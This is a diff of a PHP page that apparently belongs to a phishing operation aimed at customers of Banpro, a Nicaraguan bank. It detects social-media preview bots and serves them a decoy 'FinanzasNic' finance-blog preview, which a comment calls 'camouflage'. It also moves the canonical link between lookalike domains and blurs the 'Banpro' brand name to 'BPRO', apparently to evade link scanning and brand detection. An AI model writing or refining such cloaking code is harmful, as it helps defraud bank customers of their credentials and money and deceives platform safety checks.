@@ -10,7 +10,7 @@ if ($score < 8) {
     exit;
 }
 
-// 4) Scrapers de redes sociales => preview OG de BANPRO
+// 3) Scrapers de redes sociales => preview OG camouflage
 $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
 $social_bots = ['facebookexternalhit','Facebot','WhatsApp','TelegramBot','Twitterbot','LinkedInBot','Slackbot','Discordbot','SkypeUriPreview','Pinterest'];
 $is_social = false;
@@ -20,8 +20,8 @@ if ($is_social) {
     http_response_code(200);
     header('Content-Type: text/html; charset=UTF-8');
     header('Cache-Control: public, max-age=300');
-    $og_title = 'Banpro - Consulta tu perfil financiero';
-    $og_desc  = 'Accede a tus productos y servicios financieros en línea de forma segura y rápida.';
+    $og_title = 'FinanzasNic - Guías de Finanzas Personales para Nicaragua';
+    $og_desc  = 'Aprende a manejar tu crédito, ahorro e inversión con guías prácticas adaptadas a Nicaragua.';
     $scheme   = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https') ? 'https' : 'http';
     $base     = $scheme . '://' . ($_SERVER['HTTP_HOST'] ?? '');
     $og_url   = $base . '/';
@@ -56,7 +56,7 @@ header('X-Content-Type-Options: nosniff');
   <meta name="description" content="Aprende a manejar tus finanzas personales en Nicaragua. Guías de ahorro, crédito, inversión y presupuesto familiar para mejorar tu economía." />
   <meta name="keywords" content="finanzas personales Nicaragua, ahorro, crédito Nicaragua, cómo ahorrar dinero, presupuesto familiar, inversión Nicaragua, tasas de interés" />
   <meta name="robots" content="index, follow" />
-  <link rel="canonical" href="https://beneficiosbanpros.com/" />
+  <link rel="canonical" href="https://bnproblog.com/" />
   <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -192,7 +192,7 @@ header('X-Content-Type-Options: nosniff');
         <div class="sidebar-card">
           <h4>🏦 Bancos supervisados SIBOIF</h4>
           <ul>
-            <li>Banpro · Banco de la Producción</li>
+            <li>BPRO · Banco de la Producción</li>
             <li>BAC · Banco de América Central</li>
             <li>BDF · Banco de Finanzas</li>
             <li>Lafise Bancentro</li>
